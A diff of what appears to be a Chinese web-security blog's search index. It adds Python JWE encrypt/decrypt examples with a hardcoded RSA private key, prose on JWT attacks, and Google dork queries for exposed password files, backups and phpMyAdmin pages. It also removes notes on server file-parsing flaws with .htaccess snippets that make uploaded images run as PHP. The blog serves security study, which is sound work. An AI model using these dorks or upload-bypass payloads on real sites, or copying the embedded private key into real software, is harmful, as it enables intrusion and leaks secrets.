公钥加密对称密钥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_with_rsa</span>(<span class="params">symmetric_key, public_key</span>):</span><br><span class="line">    encrypted_key = public_key.encrypt(</span><br><span class="line">        symmetric_key,</span><br><span class="line">        asymmetric_padding.OAEP(</span><br><span class="line">            mgf=asymmetric_padding.MGF1(algorithm=hashes.SHA256()),</span><br><span class="line">            algorithm=hashes.SHA256(),</span><br><span class="line">            label=<span class="literal">None</span></span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> encrypted_key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 AES 加密数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_with_aes</span>(<span class="params">data, symmetric_key, iv</span>):</span><br><span class="line">    <span class="comment"># 先进行数据填充</span></span><br><span class="line">    padder = padding.PKCS7(algorithms.AES.block_size).padder()</span><br><span class="line">    padded_data = padder.update(data) + padder.finalize()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用 AES GCM 加密模式</span></span><br><span class="line">    cipher = Cipher(algorithms.AES(symmetric_key), modes.GCM(iv), backend=default_backend())</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ciphertext = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 返回加密后的数据和认证标签</span></span><br><span class="line">    <span class="keyword">return</span> ciphertext, encryptor.tag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例数据（JSON 格式数据）</span></span><br><span class="line">data_to_encrypt = json.dumps(&#123;</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;1234567890&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;mondo&quot;</span></span><br><span class="line">&#125;).encode()  <span class="comment"># 将 JSON 数据转换为字节字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载 RSA 公钥</span></span><br><span class="line">public_key_pem = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">-----BEGIN RSA PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIIBCgKCAQEAxvltv9COc/jSfzJ8zbHroUzmFa2vVNLdv9KJn1BzyJhIN6xUdPXc</span></span><br><span class="line"><span class="string">4NMqp6cr8RFMnvsHkDzs4OUwozZnpkmzjgivW2/uFmUTGnE7hzt5Dq1pF/JmHREn</span></span><br><span class="line"><span class="string">oyyyBdhXPVCp4Xayd+ql8Jns4dEQxcqDrwv7VvIvRqvWo+rVY7mfNGCGrIww9/cj</span></span><br><span class="line"><span class="string">WMiiWLV6TtJwI7c+ro6RpCZ6bGAaujf6lLRdWNIin5Ya+HIuiGtcYaOsY04F+Nav</span></span><br><span class="line"><span class="string">fOigBbRJ7KjRDc9t+9aFMuuCNFAzP/Grj/yty/l4Fe5NwossSJKI9NKH5XBpkWkK</span></span><br><span class="line"><span class="string">iKYwt2hTNQ7Tqk/WTvbBwzgnqotCYnDLYwIDAQAB</span></span><br><span class="line"><span class="string">-----END RSA PUBLIC KEY-----</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">public_key = serialization.load_pem_public_key(public_key_pem.encode(), backend=default_backend())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 生成对称密钥</span></span><br><span class="line">symmetric_key = generate_symmetric_key()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 使用 RSA 公钥加密对称密钥</span></span><br><span class="line">encrypted_key = encrypt_with_rsa(symmetric_key, public_key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 生成初始化向量 IV</span></span><br><span class="line">iv = generate_iv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 使用 AES 加密数据</span></span><br><span class="line">ciphertext, tag = encrypt_with_aes(data_to_encrypt, symmetric_key, iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 构建 protected header</span></span><br><span class="line">protected_header = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RSA-OAEP&quot;</span>,  <span class="comment"># 公钥加密对称密钥算法</span></span><br><span class="line">    <span class="string">&quot;enc&quot;</span>: <span class="string">&quot;A256GCM&quot;</span>,   <span class="comment"># 对称加密算法，使用 AES GCM 模式</span></span><br><span class="line">    <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;my-key-id&quot;</span>  <span class="comment"># 可选的密钥 ID</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. Base64 URL 编码所有部分</span></span><br><span class="line">protected_header_base64 = base64_url_encode(json.dumps(protected_header).encode())</span><br><span class="line">encrypted_key_base64 = base64_url_encode(encrypted_key)</span><br><span class="line">iv_base64 = base64_url_encode(iv)</span><br><span class="line">ciphertext_base64 = base64_url_encode(ciphertext)</span><br><span class="line">tag_base64 = base64_url_encode(tag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 构建 JWE 令牌</span></span><br><span class="line">jwe_token = &#123;</span><br><span class="line">    <span class="string">&quot;protected&quot;</span>: protected_header_base64.decode(),</span><br><span class="line">    <span class="string">&quot;encrypted_key&quot;</span>: encrypted_key_base64.decode(),</span><br><span class="line">    <span class="string">&quot;iv&quot;</span>: iv_base64.decode(),</span><br><span class="line">    <span class="string">&quot;ciphertext&quot;</span>: ciphertext_base64.decode(),</span><br><span class="line">    <span class="string">&quot;tag&quot;</span>: tag_base64.decode()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 JWE 令牌</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;JWE Token:&quot;</span>, json.dumps(jwe_token, indent=<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
+<p>jwe解密：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> ciphers, padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> padding <span class="keyword">as</span> asymmetric_padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 URL 解码函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_url_decode</span>(<span class="params">base64_url</span>):</span><br><span class="line">    base64_url = base64_url.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;+&#x27;</span>).replace(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    padding = <span class="string">&#x27;=&#x27;</span> * (<span class="number">4</span> - <span class="built_in">len</span>(base64_url) % <span class="number">4</span>)  <span class="comment"># 计算需要的填充字符</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(base64_url + padding)</span><br><span class="line"></span><br><span class="line"><span class="comment"># RSA 私钥解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_with_rsa</span>(<span class="params">encrypted_key, private_key</span>):</span><br><span class="line">    <span class="keyword">return</span> private_key.decrypt(</span><br><span class="line">        encrypted_key,</span><br><span class="line">        asymmetric_padding.OAEP(</span><br><span class="line">            mgf=asymmetric_padding.MGF1(algorithm=hashes.SHA256()),</span><br><span class="line">            algorithm=hashes.SHA256(),</span><br><span class="line">            label=<span class="literal">None</span></span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="comment"># AES 解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_with_aes</span>(<span class="params">ciphertext, key, iv, tag</span>):</span><br><span class="line">    <span class="comment"># 使用 AES GCM 模式解密数据</span></span><br><span class="line">    cipher = ciphers.Cipher(ciphers.algorithms.AES(key), ciphers.modes.GCM(iv, tag), backend=default_backend())</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line"><span class="comment"># JWE 数据</span></span><br><span class="line">jwe_token = &#123;</span><br><span class="line">    <span class="string">&quot;protected&quot;</span>: <span class="string">&quot;eyJhbGciOiAiUlNBLU9BRVAiLCAiZW5jIjogIkEyNTZHQ00iLCAia2lkIjogIm15LWtleS1pZCJ9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;encrypted_key&quot;</span>: <span class="string">&quot;uTkPLsJfUYVtl7zS9l7j0i1vbaSQFAWIQOJkuONkMACIZyqZGf8GP3dZh7cfdgfhd9OtVz3DJFAHru7bCgSSaY4NdA_UXd8AoI8LtMik0MPatwyzypZQuzdPJghVqaEuvEkJuayRIojM4ej_XPl0U3SO6tnvB3WZ-eHZzHBnZ_UJt-YlWlqJY6lSuLmnZBdxWG-nElcky7OS-26JSlcKtQ_mQNlX5HgWSQfCgvStgoAeokNEH2_RSkK4N0PbdOdSq4kcWNPkJqekmFyamx-e0ZmNP41BcgqNQwx8Y0hVzbLvQXuHfydpov7lTP956toB2UkDFsAyo26r3rjjbTTPAg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iv&quot;</span>: <span class="string">&quot;EDrRQTsDTfqxr19X&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ciphertext&quot;</span>: <span class="string">&quot;vz-7xLP7z-JQTuPYzK_k0ZQoYtpQgmTiWwrDDKZAX4amNOM8DNTP-IibCPFhaPTs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tag&quot;</span>: <span class="string">&quot;zbaVaXdjOMMGzgRpmUZdyw&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 解码 JWE 部分</span></span><br><span class="line">protected_header = json.loads(base64_url_decode(jwe_token[<span class="string">&#x27;protected&#x27;</span>]).decode())  <span class="comment"># 头部</span></span><br><span class="line">encrypted_key = base64_url_decode(jwe_token[<span class="string">&#x27;encrypted_key&#x27;</span>])  <span class="comment"># 解密密钥</span></span><br><span class="line">iv = base64_url_decode(jwe_token[<span class="string">&#x27;iv&#x27;</span>])  <span class="comment"># 初始化向量</span></span><br><span class="line">ciphertext = base64_url_decode(jwe_token[<span class="string">&#x27;ciphertext&#x27;</span>])  <span class="comment"># 密文</span></span><br><span class="line">tag = base64_url_decode(jwe_token[<span class="string">&#x27;tag&#x27;</span>])  <span class="comment"># 认证标签</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 加载私钥</span></span><br><span class="line">private_key_pem = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIIEqQIBAAKCAQEAxvltv9COc/jSfzJ8zbHroUzmFa2vVNLdv9KJn1BzyJhIN6xU</span></span><br><span class="line"><span class="string">dPXc4NMqp6cr8RFMnvsHkDzs4OUwozZnpkmzjgivW2/uFmUTGnE7hzt5Dq1pF/Jm</span></span><br><span class="line"><span class="string">HREnoyyyBdhXPVCp4Xayd+ql8Jns4dEQxcqDrwv7VvIvRqvWo+rVY7mfNGCGrIww</span></span><br><span class="line"><span class="string">9/cjWMiiWLV6TtJwI7c+ro6RpCZ6bGAaujf6lLRdWNIin5Ya+HIuiGtcYaOsY04F</span></span><br><span class="line"><span class="string">+NavfOigBbRJ7KjRDc9t+9aFMuuCNFAzP/Grj/yty/l4Fe5NwossSJKI9NKH5XBp</span></span><br><span class="line"><span class="string">kWkKiKYwt2hTNQ7Tqk/WTvbBwzgnqotCYnDLYwIDAQABAoIBAQCy9rHx7uHSCaE6</span></span><br><span class="line"><span class="string">6uw6DqeDAymHohqrTqZI3FMQSkp5yA5clNG6CVHLneMlvETXpNmnvN3GrCXa+gnP</span></span><br><span class="line"><span class="string">IyYC+RNY0xL2SSx6VBrkk6gZMDLoMqzt7wZNapqeN5s/iqCc86p4skw/c3whdjEL</span></span><br><span class="line"><span class="string">wwE1Bbt/fGVqhJZlGDVI25ka3VQSd56uMfZbHXqOhbg/PW/jykykWOlNRgvfMOqP</span></span><br><span class="line"><span class="string">/XiAMDCXYXYwC9MOxEbA29E7bLhVkl1hpGUOIL3CvR0Oj6E8L/B0XDnxwfm+oRGj</span></span><br><span class="line"><span class="string">AMbH9+i3dTps09cHsdZ6Y5N9KhVuFdrEEVFaB2Biqo4IulaPOBQ+C/6qlFl5hOWf</span></span><br><span class="line"><span class="string">VPmVeR+xAoGJANlmvzrSO9R1tvfwRtXHQQgc+yKhFSljlVdYufIFqS+ay3MUlA8H</span></span><br><span class="line"><span class="string">TrOptY38dJLm1qqvuijZi+4m68ZV+9fM6mRvFCBBLN08I8uQ3vSoEhgqSROBU09T</span></span><br><span class="line"><span class="string">1005kXHcqIWIIHobNlIfpqi95lwAgQVlyg7gSG7F+Ak9l1p9NWyi3TCoy7Ix1Uld</span></span><br><span class="line"><span class="string">qycCeQDqTSSPwZo7UbtUUqBpoj3bDnRC6op1ZlDAPr0BtDkAyUWBZ8X6C9pTVXR5</span></span><br><span class="line"><span class="string">5BdWPb7HvOvHWbTDty961m9ejeyKy8oe8UYVO0CgKvYi8ZSDMh66MykSd7zV6APE</span></span><br><span class="line"><span class="string">64L8IKrsLuLOvogBwejKFkw9RkWyW8lmO+Gws2UCgYhNjAHwaGdhDLA8Vp/dx5ph</span></span><br><span class="line"><span class="string">23yVSKI0xknSA1sogm5sBapGnXOGvNOM8J9LS18Fu4OdFNuxkJACXi3B7I/N1VFS</span></span><br><span class="line"><span class="string">i/DA5J6tN7OI/F8bJAx4RDUW2Q2vgTeOW1ePJueR4hG7nJNOze1zyXEvJhrfowRl</span></span><br><span class="line"><span class="string">NAmCQemM2kRvybPR0XJW1g76vB3ZcqkHAnhtuEZg04bINJQG/tKD5SgWRwSGuZKx</span></span><br><span class="line"><span class="string">O4KhJEAaZi0zgw17df8uAxLwZ1ouInQTPML0gjHfntCZvlULrxNkMg4NSTWTm+T3</span></span><br><span class="line"><span class="string">2FGBL90nq/2iGnxtMbwQG+ZgPVBWjPs/2oRwKdyoeGz0dbvvttVo9Fl7FqSPrYcY</span></span><br><span class="line"><span class="string">2kkCgYh/T+HSWYhH/liybvrA7WRSRZnpPq+zh6yCkI5c6y/gj7Il54N3AWp3+E3n</span></span><br><span class="line"><span class="string">74w+IKd1xIneqeCccq91sG9woDdbVv0Rt0e4HNDc7IEVqkwQxwN6ZUrrm+wHlU1A</span></span><br><span class="line"><span class="string">LJA4CGy/HOVdjCY+pX/f0JIWlJLEPpvAskXaKyQioyKPdDbX1mTi/cHWdAHt</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">private_key = serialization.load_pem_private_key(private_key_pem.encode(), password=<span class="literal">None</span>, backend=default_backend())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 解密对称密钥</span></span><br><span class="line">symmetric_key = decrypt_with_rsa(encrypted_key, private_key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 使用 AES 解密密文</span></span><br><span class="line">decrypted_data = decrypt_with_aes(ciphertext, symmetric_key, iv, tag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的数据:&quot;</span>, decrypted_data.decode())</span><br></pre></td></tr></table></figure>
+<h1 id="JWT攻击"><a href="#JWT攻击" class="headerlink" title="JWT攻击"></a>JWT攻击</h1><h2 id="算法攻击"><a href="#算法攻击" class="headerlink" title="算法攻击"></a>算法攻击</h2><p>算法混淆<br>(如果服务器配置了hs256的共享密钥且你能爆破成功实现对header和payload签名)<br>JWT令牌中可以使用不同的签名算法，例如HS256（HMAC）和RS256（RSA）。攻击者可以尝试通过修改算法字段（如将RS256改为HS256），然后使用共享密钥来验证JWT，这可能导致令牌的验证失败或错误地接受不可信的令牌。<br>None算法<br>某些JWT库没有正确处理None算法（表示没有签名）。攻击者可以尝试将签名算法alg的值改为None，并移除签名部分，利用服务端的验证逻辑漏洞来绕过验证。</p>
+<h2 id="密钥泄露"><a href="#密钥泄露" class="headerlink" title="密钥泄露"></a>密钥泄露</h2><p>使用已知的JWT签名算法（如HS256），攻击者可以尝试猜测密钥并生成有效的令牌。</p>
+<h2 id="令牌篡改"><a href="#令牌篡改" class="headerlink" title="令牌篡改"></a>令牌篡改</h2><p>JWT令牌的有效性是通过签名进行验证的，如果没有正确配置密钥或算法，攻击者可以篡改令牌的负载部分（如用户ID、权限等），并使用篡改后的令牌伪造身份。</p>
+<h2 id="exp绕过"><a href="#exp绕过" class="headerlink" title="exp绕过"></a>exp绕过</h2><p>JWT令牌中通常会包含过期时间（exp）。如果令牌未正确处理过期时间，攻击者可能会修改令牌中的exp字段，使其延长有效期，从而绕过过期时间限制。</p>
+<h2 id="token重放"><a href="#token重放" class="headerlink" title="token重放"></a>token重放</h2><p>攻击者获取JWT令牌后，可能会在令牌过期之前反复使用它（如利用长时间的会话保持），从而进行会话劫持。</p>
+<h2 id="不安全的存储"><a href="#不安全的存储" class="headerlink" title="不安全的存储"></a>不安全的存储</h2><p>如果JWT令牌在客户端（如浏览器）中存储不当（例如存储在localStorage或sessionStorage中），攻击者可能通过XSS攻击窃取令牌。</p>
+<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>虽然JWT令牌本身经过加密或签名，但如果负载部分（如用户身份信息、权限等）没有加密或不小心暴露，攻击者可以直接读取其中的信息，进行数据泄露攻击。<br>靶场: <a href="https://portswigger.net/web-security/jwt">https://portswigger.net/web-security/jwt</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>JWT Vulnerabilitiy</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>googlehack</title>
     <url>/posts/19623025.html</url>
-    <content><![CDATA[<h1 id="google-hacking-语法"><a href="#google-hacking-语法" class="headerlink" title="google hacking 语法"></a>google hacking 语法</h1><h1 id="Google-Hacking-语法"><a href="#Google-Hacking-语法" class="headerlink" title="Google Hacking 语法"></a>Google Hacking 语法</h1><table>
+    <content><![CDATA[<h1 id="google-hacking-基础语法"><a href="#google-hacking-基础语法" class="headerlink" title="google hacking 基础语法"></a>google hacking 基础语法</h1><hr>
+<table>
 <thead>
 <tr>
-<th><strong>目标</strong></th>
-<th><strong>语法</strong></th>
+<th>语法</th>
+<th>说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>site:</td>
+<td>限制搜索特定网站或域名</td>
+<td>&#96;site:example.com</td>
+</tr>
+<tr>
+<td>inurl:</td>
+<td>搜索 URL 中包含特定字符串</td>
+<td>&#96;inurl:admin</td>
+</tr>
+<tr>
+<td>intitle:</td>
+<td>搜索网页标题中包含特定字符串</td>
+<td>&#96;intitle:”index of” admin</td>
+</tr>
+<tr>
+<td>filetype:</td>
+<td>限制搜索特定文件类型</td>
+<td>&#96;filetype:pdf “confidential”</td>
+</tr>
+<tr>
+<td>intext:</td>
+<td>搜索网页内容中包含特定字符串</td>
+<td>&#96;intext:”password”</td>
+</tr>
+<tr>
+<td>cache:</td>
+<td>显示 Google 缓存中的页面</td>
+<td>&#96;cache:example.com</td>
+</tr>
+<tr>
+<td>link:</td>
+<td>搜索包含指向特定网站的链接的页面</td>
+<td>&#96;link:example.com</td>
+</tr>
+<tr>
+<td>related:</td>
+<td>搜索与特定网站相关的页面</td>
+<td>&#96;related:example.com</td>
+</tr>
+<tr>
+<td>“ “</td>
+<td>精确匹配某个短语</td>
+<td>&#96;”server configuration”</td>
+</tr>
+<tr>
+<td>-</td>
+<td>排除某些词汇</td>
+<td>&#96;”login page” -admin</td>
+</tr>
+</tbody></table>
+<h1 id="Google-Hacking-语法"><a href="#Google-Hacking-语法" class="headerlink" title="Google Hacking 语法"></a>Google Hacking 语法</h1><table>
+<thead>
+<tr>
+<th><strong>使用场景</strong></th>
+<th><strong>查询语法</strong></th>
 </tr>
 </thead>
 <tbody><tr>
@@ -1766,32 +1815,56 @@ w:Rock-y did-nt like that</div>
 <td>&#96;site:github.com</td>
 </tr>
 </tbody></table>
+<table>
+<thead>
+<tr>
+<th>使用场景</th>
+<th>查询语法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查找公共文件目录</td>
+<td><code>intitle:&quot;index of&quot; admin</code></td>
+<td>查找公开的文件目录，可能包含敏感文件。</td>
+</tr>
+<tr>
+<td>查找公开的用户名和密码文件</td>
+<td><code>filetype:txt &quot;password&quot;</code></td>
+<td>查找包含 “password” 的 <code>.txt</code> 文件，可能包含泄露的密码。</td>
+</tr>
+<tr>
+<td>查找配置文件或备份文件</td>
+<td><code>filetype:bak &quot;database config&quot;</code></td>
+<td>查找 <code>.bak</code> 备份文件，可能包含敏感配置。</td>
+</tr>
+<tr>
+<td>查找暴露的数据库</td>
+<td><code>inurl:phpmyadmin</code></td>
+<td>查找公开的 <code>phpMyAdmin</code> 登录页面，可能用于 SQL 注入。</td>
+</tr>
+<tr>
+<td>查找包含敏感信息的 PDF 文件</td>
+<td><code>filetype:pdf &quot;confidential&quot;</code></td>
+<td>查找包含 “confidential” 的 PDF 文件，可能暴露敏感文档。</td>
+</tr>
+<tr>
+<td>查找开放的 FTP 服务器</td>
+<td><code>intitle:&quot;index of&quot; ftp</code></td>
+<td>查找公开的 FTP 目录，可能允许文件下载。</td>
+</tr>
+<tr>
+<td>查找特定版本的应用漏洞</td>
+<td><code>inurl:&quot;/wp-content/plugins/&quot; filetype:txt</code></td>
+<td>查找 WordPress 插件相关的公开文本文件，可能泄露版本信息。</td>
+</tr>
+</tbody></table>
 ]]></content>
       <categories>
         <category>语法</category>
       </categories>
       <tags>
         <tag>Google hacking</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>解析漏洞知识记录</title>
-    <url>/posts/64ae55e3.html</url>
-    <content><![CDATA[<h1 id="服务器文件解析漏洞原理"><a href="#服务器文件解析漏洞原理" class="headerlink" title="服务器文件解析漏洞原理"></a>服务器文件解析漏洞原理</h1><p>当Apache、IIS、Nginx等web容器在解析文件时,若网站管理员操作不当或web服务器自身的安全缺陷,导致特殊的文件被当作脚本执行</p>
-<h1 id="IIS-5-x-IIS-6"><a href="#IIS-5-x-IIS-6" class="headerlink" title="IIS 5.x&#x2F;IIS 6"></a>IIS 5.x&#x2F;IIS 6</h1><p>影响版本: IIS 5.x&#x2F;IIS 6(大多数为windows 2003)<br>开发语句为asp,无法解析aspx</p>
-<h2 id="目录解析漏洞利用"><a href="#目录解析漏洞利用" class="headerlink" title="目录解析漏洞利用:"></a>目录解析漏洞利用:</h2><p>在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹,那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp,那么 &#x2F;test.asp&#x2F;1.jpg 将被当做asp文件来执行。</p>
-<h2 id="文件解析漏洞利用"><a href="#文件解析漏洞利用" class="headerlink" title="文件解析漏洞利用:"></a>文件解析漏洞利用:</h2><p>分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa   .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 <em>.asp;.jpg、</em>.asa;.jpg、*.cer;.jpg 后缀的文件,就可以通过服务器校验,并且服务器会把它当成asp文件执行。</p>
-<h1 id="IIS-7-0-IIS-7-5-Nginx-8-03"><a href="#IIS-7-0-IIS-7-5-Nginx-8-03" class="headerlink" title="IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03"></a>IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03</h1><p>IIS利用条件:<br>IIS &gt; 7<br>默认开启FAST-CGI时,直接在url中图片地址后输入&#x2F;*.php会被解析为php文件<br>Nginx利用条件:<br>nginx &lt; 8.03<br>php配置文件cgi.fix_pathinfo默认开启时,当url有不存在的文件时,php向前递归解析<br>漏洞利用:<br>访问<a href="http://example.com/hack.jpg/1.php%E6%97%B6,hack.jpg%E4%BC%9A%E8%A2%AB%E5%BD%93%E4%BD%9Cphp%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C">http://example.com/hack.jpg/1.php时,hack.jpg会被当作php脚本执行</a></p>
-<h1 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h1><h2 id="文件名解析"><a href="#文件名解析" class="headerlink" title="文件名解析"></a>文件名解析</h2><p>apache自右向左解析,若遇到不可识别解析则再往左判断,如hack.php.aaa.rar,在apache中无法识别aaa和rar,则实际解析为hack.php</p>
-<h2 id="后缀识别"><a href="#后缀识别" class="headerlink" title="后缀识别"></a>后缀识别</h2><p>apache支持的后缀识别有很多:php、php3、php4、php5、phtml、pht、php3p、phps</p>
-<h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>.htaccess文件是Apache服务器中的一个配置文件,它负责相关目录下的网页配置。<br>该文件默认开启，启用和关闭在 httpd.conf 文件中配置。<br>条件:<br>mod_rewrite开启<br>AllowOverride All</p>
-<p>利用:<br>通过构造一个.htaccess文件并上传(前提是允许上传.htaccess文件)</p>
-<p>将所有名字里含shell的文件识别为php脚本执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch   &quot;shell&quot;&gt; </span><br><span class="line">SetHandler  application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-<p>让.jpg后缀名文件以php脚本执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>解析漏洞</tag>
       </tags>
   </entry>
   <entry>
